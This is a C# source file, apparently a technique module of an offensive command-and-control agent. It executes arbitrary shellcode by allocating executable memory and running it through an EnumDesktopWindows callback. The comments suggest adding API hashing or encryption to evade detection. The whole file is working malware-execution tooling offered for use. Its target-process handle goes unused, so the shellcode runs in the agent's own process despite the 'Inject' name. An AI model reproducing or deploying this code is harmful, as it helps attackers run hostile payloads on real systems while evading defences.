using Agent.Interfaces;
using Agent.Models;
using Invoker.Dynamic;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
using static Invoker.Data.Win32;

//based upon https://github.com/JkMaFlLi/xorInject
namespace Agent
{
    internal class DeskEnum : ITechnique
    {
        int ITechnique.id => 4;
        private static readonly TaskScheduler _singleThreadScheduler = new ConcurrentExclusiveSchedulerPair().ExclusiveScheduler;

        async Task<bool> ITechnique.Inject(ISpawner spawner, SpawnOptions spawnOptions, byte[] shellcode)
        {
            return await Task.Factory.StartNew(async () =>
            {
                spawnOptions.suspended = false;

                if (!await spawner.Spawn(spawnOptions))
                {
                    return false;
                }

                SafeProcessHandle hProc;

                if (!spawner.TryGetHandle(spawnOptions.task_id, out hProc))
                {
                    return false;
                }

                return Run(hProc.DangerousGetHandle(), shellcode);
            }, CancellationToken.None, TaskCreationOptions.None, _singleThreadScheduler).Unwrap();
        }


        private bool Run(IntPtr hTarget, byte[] shellcode)
        {
            List<string> resolveFuncs = new List<string>
            {
                "va",
                //"cgti",                //GetCurrentThreadId (kernel32.dll 9DF4CEF5B9AD88BF8DB22B3A55740BA0
                //"gtd",                //GetThreadDesktop (user32.dll)
                //"edw"                //EnumDesktopWindows (user32.dll)

            };

            if (!Resolver.TryResolveFuncs(resolveFuncs, "k32", out var err))
            {
                return false;
            }

            //Injection code; optionally add API hashing or AES encryption

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            if (funcAddr == IntPtr.Zero)
            {
                Console.WriteLine("Memory allocation failed");
                return false;
            }
            Console.WriteLine("Allocated memory at: " + funcAddr);

            Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);

            IntPtr hDesktop = GetThreadDesktop(GetCurrentThreadId());
            if (hDesktop == IntPtr.Zero)
            {
                Console.WriteLine("Failed to get desktop handle");
                return false;
            }
            Console.WriteLine("Found desktop handle: " + hDesktop);

            //Execute EnumDesktopWindows
            return EnumDesktopWindows(hDesktop, DesktopCallback, funcAddr);
        }

        private static bool DesktopCallback(IntPtr hwnd, IntPtr lParam)
        {
            ShellcodeDelegate shellcodeFunc = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(lParam, typeof(ShellcodeDelegate));
            shellcodeFunc();
            return false;
        }

        //Delegate types
        private delegate bool EnumDesktopWindowsProc(IntPtr hwnd, IntPtr lParam);
        private delegate void ShellcodeDelegate();

        //ToBeImplemented
        private delegate IntPtr VADelegate(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
        private delegate IntPtr GTDDelegate(uint dwThreadId);
        private delegate uint GCT();


        //constants
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;


        //DLL Imports and structures
        [DllImport("user32.dll")]
        private static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);

        [DllImport("user32.dll")]
        private static extern IntPtr GetThreadDesktop(uint dwThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint GetCurrentThreadId();


    }
}
